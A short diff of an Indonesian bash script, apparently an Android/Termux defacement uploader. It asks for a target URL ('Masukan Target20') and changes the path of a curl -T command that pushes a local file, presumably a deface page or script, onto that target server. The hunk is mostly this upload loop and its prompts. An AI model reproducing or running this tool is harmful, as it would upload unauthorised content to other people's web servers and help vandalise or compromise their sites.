@@ -336,7 +336,7 @@ echo
 echo $white"Masukan Target20 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Crot"$white
 read -p " ╰─$ " target20
-curl -T /storage/emulated/0/$script $target20
+curl -T /storage/emulated/0/download/$script $target20
 echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target20/$script"
 echo
 echo
